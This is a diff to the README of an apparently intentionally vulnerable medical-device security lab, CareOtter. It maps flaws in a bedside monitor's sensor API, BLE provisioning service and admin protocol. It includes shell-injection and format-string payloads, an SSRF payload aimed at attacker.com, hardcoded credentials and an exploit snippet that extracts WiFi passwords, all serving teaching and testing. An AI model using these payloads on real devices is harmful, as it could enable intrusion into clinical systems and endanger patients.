@@ -84,31 +84,45 @@ Because CareOtter mirrors the control surface of a real cardiac implant, the lab
 
 Python service (`/opt/medical-sensor/sensor_service.py`) running on the bedside monitor. It reads cardiac telemetry from the MAX30102 DAI/ICD sensor over I2C (or from a software simulator when no hardware is present) and exposes the vitals over HTTP for consumption by the Cloud API and local dashboards.
 
-| Method | Endpoint    | Auth | Description |
-|--------|-------------|------|-------------|
-| GET    | `/vitals`   | None | Current BPM, SpO2, raw ADC values, timestamp |
-| GET    | `/health`   | None | Returns `ok` (plain text) |
-| GET    | `/config`   | None | Active service configuration (sample rate, ports, log path) |
-| GET    | `/log`      | None | Full in-memory vitals history buffer (circular, up to 1440 entries) |
-| GET    | `/log/last` | None | Most recent vitals summary entry |
-| GET    | `/reload`   | None | Forces log file reopen (alternative to SIGUSR1) |
+| Method | Endpoint    | Auth         | Description                                                                                            |
+| ------ | ----------- | ------------ | ------------------------------------------------------------------------------------------------------ |
+| GET    | `/vitals`   | `X-API-Key`  | Current BPM, SpO2, raw ADC values, timestamp                                                           |
+| GET    | `/health`   | None         | Returns `ok` (plain text) — liveness probe, intentionally public                                       |
+| GET    | `/config`   | `X-API-Key`  | Active service configuration (sample rate, ports, log path, **api_key**, cloud_endpoint, cloud_token)  |
+| GET    | `/log`      | `X-API-Key`  | Full in-memory vitals history buffer (circular, up to 1440 entries)                                    |
+| GET    | `/log/last` | `X-API-Key`  | Most recent vitals summary entry                                                                       |
+| GET    | `/reload`   | `X-API-Key`  | Forces log file reopen (alternative to SIGUSR1)                                                        |
+| GET    | `/alerts`   | `X-API-Key`  | Current thresholds plus per-channel alert firing state                                                 |
+| GET    | `/history`  | `X-API-Key`  | Vitals history filtered by `?minutes=` (no upper bound validation — full buffer leak with `minutes=99999`) |
+| POST   | `/thresholds` | `X-API-Key` | Update clinical alert thresholds (`bpm_min`, `bpm_max`, `spo2_min`); accepts partial JSON updates      |
+
+**Sensor auth model.** All endpoints **except `/health`** require `X-API-Key: <api_key>`. The value is loaded from `/opt/medical-sensor/config.json` (`api_key` field, default `"careotter-2024-lab"`) into the module-level constant `API_KEY`. The check is a plain Python `==` between the request header and `API_KEY` (timing side-channel, vuln #14). On failed auth the server replies with HTTP 401 and a JSON body whose `hint` field names the expected header — that hint is the reconnaissance leak documented in vuln #15.
 
 **Example responses:**
 
 ```bash
-$ curl http://192.168.2.1:8081/vitals
+# Unauthenticated probe — every protected endpoint behaves the same
+$ curl -s -i http://192.168.2.1:8081/config | tail -1
+{"error": "unauthorized", "hint": "X-API-Key header required"}
+
+# Authenticated read
+$ curl -s -H "X-API-Key: careotter-2024-lab" http://192.168.2.1:8081/vitals
 {"bpm": 78, "spo2": 98, "red_raw": 61085, "ir_raw": 61036, "timestamp": 1773738799.89, "source": "simulator"}
 
-$ curl http://192.168.2.1:8081/config
-{"use_real_hardware": false, "bpm": 72, "spo2": 98, "http_port": 8081,
- "log_file": "/tmp/medical-logs/vitals.log", "sample_rate": 10,
+$ curl -s -H "X-API-Key: careotter-2024-lab" http://192.168.2.1:8081/config
+{"device_id": "careotter-sensor-04", "firmware_version": "1.4.2",
+ "use_real_hardware": false, "bpm": 72, "spo2": 98, "http_port": 8081,
+ "sample_rate": 1, "log_file": "/tmp/medical-logs/vitals.log",
+ "api_key": "careotter-2024-lab",                          // <-- token echoed in the response
+ "cloud_endpoint": "https://api.careotter.io/ingest",
+ "cloud_token": "eyJhbGciOiJIUzI1NiJ9.disabled",
  "summary_every_s": 60, "log_buffer_max": 1440}
 
-$ curl http://192.168.2.1:8081/log/last
+$ curl -s -H "X-API-Key: careotter-2024-lab" http://192.168.2.1:8081/log/last
 {"bpm_avg": 78.0, "bpm_min": 72, "bpm_max": 84, "spo2_avg": 98.0,
  "spo2_min": 98, "spo2_max": 98, "samples": 600, "timestamp": 1773738765.06, "source": "simulator"}
 
-$ curl http://192.168.2.1:8081/health
+$ curl -s http://192.168.2.1:8081/health
 ok
 ```
 
@@ -131,21 +145,21 @@ Total header: 8 bytes. Payload immediately follows. Server closes connection aft
 
 #### Command Reference
 
-| Cmd  | Name            | Auth | Payload              | Response             | Notes |
-|------|-----------------|------|----------------------|----------------------|-------|
-| 0x01 | SYS_INFO        | No   | —                    | `v:<kernel>\|m:<arch>` | Kernel release + machine arch |
-| 0x02 | AUTHENTICATE    | No   | Token string         | `AUTH_SUCCESS` / `AUTH_FAIL` | **VULN: hardcoded token** |
-| 0x03 | GET_NETWORK     | Yes  | —                    | Raw `/etc/config/wireless` | **VULN: exposes WiFi PSK** |
-| 0x04 | SET_PREFS       | Yes  | TLV hex bytes        | `PREFS_SAVED` | **VULN: TLV integer underflow → BOF** |
-| 0x05 | VERIFY_STATUS   | No   | Module name string   | Status diagnostic text | **VULN: format string** |
-| 0x06 | SET_WIFI        | Yes  | `"SSID\|PSK"`        | `WIFI_UPDATED` / `WIFI_ERR` / `ERR_*` | **FLAW: shell injection via system()** |
-| 0x07 | GET_VITALS      | No   | —                    | Full HTTP response from :8081/vitals | IGP→HTTP proxy |
-| 0x08 | SET_THRESHOLD   | Yes  | TLV (0xBB + 0xCC)   | `THRESHOLD_SET` | Clean parser, writes to `/tmp/careotter.thresholds` |
-| 0x09 | REBOOT_SERVICE  | Yes  | Service name string  | `SVC_RESTART_QUEUED` / `REBOOT_ERR` | **FLAW: no waitpid() → zombie processes** |
-| 0x0A | GET_LOG         | Yes  | —                    | Last 512 bytes of `/tmp/careservice.log` | `LOG_EMPTY` if not present |
-| 0x0B | DEFIBRILLATE    | Yes  | Any string           | `DEFIB_TRIGGERED:200J:<timestamp>` | **VULN: format string in event log**; simulates 200 J discharge |
-| 0x0C | EMERGENCY_ALERT | Yes  | Alert message string | `ALERT_SENT:<msg>` | **FLAW: command injection via `curl` in `system()`**; reads endpoint from `/etc/careotter/alert.conf` |
-| 0x0D | DEAUTHENTICATE  | No   | —                    | `DEAUTH_OK`        | Resets `authenticated=0`. Called by Cloud API after each protected operation. |
+| Cmd  | Name            | Auth | Payload              | Response                                 | Notes                                                                                                 |
+| ---- | --------------- | ---- | -------------------- | ---------------------------------------- | ----------------------------------------------------------------------------------------------------- |
+| 0x01 | SYS_INFO        | No   | —                    | `v:<kernel>\|m:<arch>`                   | Kernel release + machine arch                                                                         |
+| 0x02 | AUTHENTICATE    | No   | Token string         | `AUTH_SUCCESS` / `AUTH_FAIL`             | **VULN: hardcoded token**                                                                             |
+| 0x03 | GET_NETWORK     | Yes  | —                    | Raw `/etc/config/wireless`               | **VULN: exposes WiFi PSK**                                                                            |
+| 0x04 | SET_PREFS       | Yes  | TLV hex bytes        | `PREFS_SAVED`                            | **VULN: TLV integer underflow → BOF**                                                                 |
+| 0x05 | VERIFY_STATUS   | No   | Module name string   | Status diagnostic text                   | **VULN: format string**                                                                               |
+| 0x06 | SET_WIFI        | Yes  | `"SSID\|PSK"`        | `WIFI_UPDATED` / `WIFI_ERR` / `ERR_*`    | **FLAW: shell injection via system()**                                                                |
+| 0x07 | GET_VITALS      | No   | —                    | Full HTTP response from :8081/vitals     | IGP→HTTP proxy                                                                                        |
+| 0x08 | SET_THRESHOLD   | Yes  | TLV (0xBB + 0xCC)    | `THRESHOLD_SET`                          | Clean parser, writes to `/tmp/careotter.thresholds`                                                   |
+| 0x09 | REBOOT_SERVICE  | Yes  | Service name string  | `SVC_RESTART_QUEUED` / `REBOOT_ERR`      | **FLAW: no waitpid() → zombie processes**                                                             |
+| 0x0A | GET_LOG         | Yes  | —                    | Last 512 bytes of `/tmp/careservice.log` | `LOG_EMPTY` if not present                                                                            |
+| 0x0B | DEFIBRILLATE    | Yes  | Any string           | `DEFIB_TRIGGERED:200J:<timestamp>`       | **VULN: format string in event log**; simulates 200 J discharge                                       |
+| 0x0C | EMERGENCY_ALERT | Yes  | Alert message string | `ALERT_SENT:<msg>`                       | **FLAW: command injection via `curl` in `system()`**; reads endpoint from `/etc/careotter/alert.conf` |
+| 0x0D | DEAUTHENTICATE  | No   | —                    | `DEAUTH_OK`                              | Resets `authenticated=0`. Called by Cloud API after each protected operation.                         |
 
 #### TLV Formats
 
@@ -192,16 +206,16 @@ print(igp(0x08, tlv))                    # SET_THRESHOLD
 
 Python service (`/opt/medical-sensor/ble_server.py`) using `dbus_fast` over BlueZ D-Bus. Advertises as `CareOtter_HR`.
 
-| GATT Service | UUID | Characteristic | UUID | Properties |
-|---|---|---|---|---|
-| Heart Rate | `0000180d-…` | HR Measurement | `00002a37-…` | notify, read |
-| Pulse Oximeter | `00001822-…` | PLX Continuous | `00002a5f-…` | notify, read |
-| Battery | `0000180f-…` | Battery Level | `00002a19-…` | read |
-| Device Info | `0000180a-…` | Manufacturer Name | `00002a29-…` | read |
-| Device Info | `0000180a-…` | Model Number | `00002a24-…` | read |
-| **Alert/Config** | **`0000ff00-…`** | **Alert Threshold** | **`0000ff01-…`** | **read, write, notify** |
-| **Factory Provisioning** (hidden) | **`0000ff10-…`** | **Provisioning Config** | **`0000ff11-…`** | **read, write, notify** |
-| **Factory Provisioning** (hidden) | **`0000ff10-…`** | **Provisioning Auth/PIN** | **`0000ff12-…`** | **read, write** |
+| GATT Service                      | UUID             | Characteristic            | UUID             | Properties              |
+| --------------------------------- | ---------------- | ------------------------- | ---------------- | ----------------------- |
+| Heart Rate                        | `0000180d-…`     | HR Measurement            | `00002a37-…`     | notify, read            |
+| Pulse Oximeter                    | `00001822-…`     | PLX Continuous            | `00002a5f-…`     | notify, read            |
+| Battery                           | `0000180f-…`     | Battery Level             | `00002a19-…`     | read                    |
+| Device Info                       | `0000180a-…`     | Manufacturer Name         | `00002a29-…`     | read                    |
+| Device Info                       | `0000180a-…`     | Model Number              | `00002a24-…`     | read                    |
+| **Alert/Config**                  | **`0000ff00-…`** | **Alert Threshold**       | **`0000ff01-…`** | **read, write, notify** |
+| **Factory Provisioning** (hidden) | **`0000ff10-…`** | **Provisioning Config**   | **`0000ff11-…`** | **read, write, notify** |
+| **Factory Provisioning** (hidden) | **`0000ff10-…`** | **Provisioning Auth/PIN** | **`0000ff12-…`** | **read, write**         |
 
 BLE reads vitals from the local sensor service at `http://127.0.0.1:8081/vitals` every notification cycle.
 
@@ -249,7 +263,7 @@ The characteristic `0xFF01` implements the **CareOtter Secure Config Protocol v1
 
 The **Factory Provisioning Service** (`0xFF10`) is a secondary GATT channel **not advertised in the advertisement**. The manufacturer reserves it for installation technicians to configure the bedside monitor in the clinic before it has WiFi connectivity. According to the manufacturer's official documentation, this channel should automatically disable 30 minutes after first power-on; in practice, the firmware never performs this check.
 
-> **Lab Narrative**: The bedside monitor ships from the factory with **no WiFi credentials, no Cloud API endpoint, and no user accounts**. During installation at the clinic, the biomedical technician pairs their tablet with the monitor over BLE, enters the factory PIN (`1234`), and sends:
+> **Lab Narrative**: The bedside monitor ships from the factory with **no WiFi credentials, no Cloud API endpoint, and no user accounts**. During installation at the clinic, the biomedical technician pairs their tablet with the monitor over BLE, enters the factory PIN (`6767`), and sends:
 > 1. Hospital WiFi credentials (`wifi_set`)
 > 2. Cloud API URL (`cloud_set`)
 > 3. Patient account (`patient_set`)
@@ -305,7 +319,7 @@ The **Factory Provisioning Service** (`0xFF10`) is a secondary GATT channel **no
 
 - **P1 — Hidden Service / Information Disclosure**: UUID `0xFF10` does not appear in advertising, but is visible via GATT service discovery (`discover_services()` in `bleak`). An attacker connecting to `CareOtter_HR` can enumerate all services and discover the hidden channel.
 - **P2 — No BLE Pairing Required**: Any BLE client can connect and interact with the provisioning service without pairing or bonding.
-- **P3 — Hardcoded PIN + No Rate Limiting**: The factory PIN is `1234` on all devices. There is no lockout after N failed attempts, making brute-force trivial.
+- **P3 — Hardcoded PIN + No Rate Limiting**: The factory PIN is `6767` on all devices. There is no lockout after N failed attempts, making brute-force trivial.
 - **P4 — Shell Injection (`wifi_set`)**: The `ssid` and `psk` fields are interpolated directly into a `system("uci set wireless…")` command without escaping shell metacharacters. Payload `{"cmd":"wifi_set","ssid":"'; reboot; #'","psk":"x"}` executes arbitrary commands.
 - **P5 — WiFi PSK Leak**: `ReadValue` returns the current WiFi password in plaintext (`wifi_psk`).
 - **P6 — SSRF via `cloud_set` + Signature Interception**: The Cloud API URL is not validated. An attacker can redirect the monitor to an attacker-controlled server (`{"cmd":"cloud_set","url":"http://attacker.com:5002"}`). When the monitor sends its registration POST, the attacker captures the hardcoded factory signature (`CareOtterFactorySig2026`) and both admin/patient credentials, allowing complete backend impersonation or account takeover.
@@ -329,8 +343,8 @@ async def main():
         prov_uuids = [s.uuid for s in services.services.values() if "ff10" in s.uuid]
         print("Hidden provisioning service:", prov_uuids)
 
-        # Step 2: bypass PIN (or brute force 1234)
-        await c.write_gatt_char(PROV_AUTH_UUID, b"1234")
+        # Step 2: bypass PIN (or brute force 6767)
+        await c.write_gatt_char(PROV_AUTH_UUID, b"6767")
 
         # Step 3: extract current WiFi credentials (P5)
         data = await c.read_gatt_char(PROV_CONFIG_UUID)
@@ -527,6 +541,28 @@ docker compose up careotter-api
 
 ---
 
+## Lab Scope and Phases
+
+This lab is designed around **two distinct operational phases** of the CareOtter ecosystem. Understanding the boundary between them is essential for correct vulnerability mapping and attack-chain construction.
+
+### Phase 1 — Initial Device Provisioning (In Scope)
+
+This is the **focus of the lab**. The bedside monitor ships from the factory with no WiFi credentials, no Cloud API endpoint, and no user accounts. The attacker interacts with the device during this pre-operational window to discover and exploit vulnerabilities in:
+
+- **BLE GATT services** (hidden provisioning channel `0xFF10`, unauthenticated pairing, hardcoded PIN)
+- **IGP v4 admin protocol** (hardcoded token, command injection, format strings, global auth state)
+- **Cloud API attack surface exposed during registration** (`/hint`, `/admin/device/register` with hardcoded signature, weak JWT)
+
+All documented attack chains (A–F) assume this phase. The device has **not yet** joined the hospital WiFi, and the Cloud API database is empty until the monitor sends its registration POST.
+
+### Phase 2 — Post-Provisioning Operational Mode (Out of Scope)
+
+Once the biomedical technician completes BLE provisioning, the monitor joins the hospital WiFi and the Cloud API creates the `admin` and `patient` accounts. At this point the ecosystem transitions to **operational mode**: the mobile app and web portals authenticate with existing accounts, vitals stream over WiFi, and the provisioning channel should (but does not) expire.
+
+The endpoint `GET /initialize_iot` exists in the Cloud API codebase **strictly as a fallback for lab playability**. It shortcuts Phase 1 by creating default `admin`/`patient` accounts and falling back to Ethernet polling (`192.168.2.1`). Because it represents a post-provisioning operational state rather than the initial attack surface, **it is considered out of scope for the CareOtter attack playbook and vulnerability checklist**. Attackers should not rely on it for chain construction; all reproducible test cases assume the device is provisioned through the intended BLE → signature-registration flow or is attacked directly via IGP/BLE before provisioning completes.
+
+---
+
 ## Vulnerability Map
 
 | #      | Type                                   | Location                                                                               | Trigger                                                                                                          | OWASP | CWE |
@@ -543,9 +579,12 @@ docker compose up careotter-api
 | 10     | Flask debug mode                       | `app.py` — `app.run(debug=(vuln == 1))`                                                | Werkzeug interactive debugger active; RCE via PIN bypass                                                         | API8 | CWE-489 |
 | 11     | Format string (therapy log)            | `careservice.c` — cmd 0x0B DEFIBRILLATE, `snprintf(fmt_buf, sizeof(fmt_buf), payload)` | Payload `%x.%x.%x` leaks stack into `/tmp/careotter_events.log`; `%n` writes                                     | IoT I9 | CWE-134 |
 | 12     | Command injection (alert)              | `careservice.c` — cmd 0x0C EMERGENCY_ALERT, `system(cmd)` with `curl … msg=%s`         | Payload `test'; reboot #` injects shell metacharacters through curl's `-d` parameter                             | IoT I9 | CWE-78 |
+| 13     | Hardcoded API token (sensor)           | `sensor_service.py` — `API_KEY` loaded from `config.json` (`"careotter-2024-lab"`)     | `cat /opt/medical-sensor/config.json` reveals the token; required in the **`X-API-Key`** request header | IoT I1 | CWE-798 |
+| 14     | Timing side-channel (sensor auth)      | `sensor_service.py:_check_auth()` — `self.headers.get("X-API-Key", "") == API_KEY`     | Plain `==` comparison short-circuits on first mismatched byte; remote timing attack against `X-API-Key`            | IoT I9 | CWE-208 |
+| 15     | Information disclosure (sensor 401)    | `sensor_service.py:_send_401()` — body `{"error":"unauthorized","hint":"X-API-Key header required"}` | Unauthenticated probe of any protected endpoint (e.g. `/config`, `/vitals`) returns a 401 whose `hint` field names the expected header — turns blind probing into a targeted token hunt | IoT I6 | CWE-200 |
 | **P1** | **Hidden BLE service**                 | `ble_server.py` — `PROV_SERVICE_UUID` (`0xFF10`) not in advertising                    | GATT service discovery reveals the undocumented provisioning channel                                             | IoT I3 / Mobile M8 | CWE-200 |
 | **P2** | **No BLE pairing required**            | `ble_server.py` — `ProvisioningConfigChrc` flags `read,write,notify`                   | Any BLE client can connect and interact without bonding/pairing                                                  | IoT I2 / Mobile M3 | CWE-306 |
-| **P3** | **Hardcoded PIN + no rate limit**      | `ble_server.py` — `PROV_PIN_FACTORY = "1234"`                                          | Brute force 4-digit PIN trivially; no lockout after failed attempts                                              | IoT I5 / Mobile M1 | CWE-798 |
+| **P3** | **Hardcoded PIN + no rate limit**      | `ble_server.py` — `PROV_PIN_FACTORY = "6767"`                                          | Brute force 4-digit PIN trivially; no lockout after failed attempts                                              | IoT I5 / Mobile M1 | CWE-798 |
 | **P4** | **Shell injection (BLE provisioning)** | `ble_server.py` — `wifi_set` via `os.system(f"uci set … ssid='{ssid}' …")`             | Payload `{"cmd":"wifi_set","ssid":"'; reboot; #'"}` injects shell commands                                       | IoT I9 / Mobile M7 | CWE-78 |
 | **P5** | **WiFi PSK plaintext leak**            | `ble_server.py` — `ProvisioningConfigChrc.ReadValue` returns `wifi_psk`                | Read the characteristic to obtain the current WiFi password in plaintext                                         | IoT I6 | CWE-312 |
 | **P6** | **SSRF via cloud_set**                 | `ble_server.py` — `cloud_set` accepts any URL without validation                       | Redirect monitor's Cloud API traffic to attacker-controlled server                                               | API7 / IoT I3 | CWE-918 |
@@ -591,6 +630,48 @@ Before starting the CareOtter lab, ensure the following physical network topolog
 | Medical Sensor HTTP | `192.168.2.1:8081` |
 | Cloud API (vulnerable) | `192.168.2.2:5002` |
 | BLE | Advertised as `CareOtter_HR` |
+
+### Cloud API Setup & WiFi Auto-Provisioning
+
+The Cloud API runs as a Docker container on the attacker PC. By default it communicates with the Raspberry Pi over the dedicated Ethernet link (`192.168.2.1`).
+
+**Basic startup (Ethernet only):**
+```bash
+cd cloud_api/careotter
+docker compose up -d --build
+
+# Verify
+curl http://localhost:5002/api/health
+```
+
+**Optional — auto-provision WiFi credentials:**
+
+If you want the bedside monitor to join the shared WiFi network automatically (so the mobile app or Cloud API can reach it over WiFi in addition to Ethernet), pass `WIFI_SSID` and `WIFI_PSK` as environment variables before calling `/initialize_iot`.
+
+1. Export the variables (or create a `.env` file in `cloud_api/careotter/`):
+   ```bash
+   export WIFI_SSID="MyNetwork"
+   export WIFI_PSK="secret123"
+   ```
+
+2. Start the container:
+   ```bash
+   cd cloud_api/careotter
+   docker compose up -d --build
+   ```
+
+3. Trigger initialization:
+   ```bash
+   curl http://localhost:5002/initialize_iot
+   ```
+
+**What happens under the hood:**
+- `/initialize_iot` detects that `WIFI_SSID` and `WIFI_PSK` are non-empty.
+- It temporarily forces `Config.DEVICE_IP = 192.168.2.1` (Ethernet) and instantiates a fresh `DeviceService`.
+- `DeviceService.set_wifi(ssid, psk)` sends IGP command `0x06 SET_WIFI` to the Pi, which executes `uci set wireless...@wifi-iface[0].ssid='...'` and commits the configuration.
+- The original `DEVICE_IP` is restored, so subsequent Cloud API calls continue to use the configured target (Ethernet fallback or the WiFi IP registered via BLE).
+
+> **Scope note:** This WiFi push is part of the **out-of-scope** `/initialize_iot` lab-playability fallback. In the intended attack flow, WiFi credentials are written through the BLE Factory Provisioning Channel (`0xFF10` → `wifi_set`). The Docker-based auto-provisioning is provided strictly for operators who want a one-command setup without interacting with BLE.
 
 ## THINGS TO DO
 
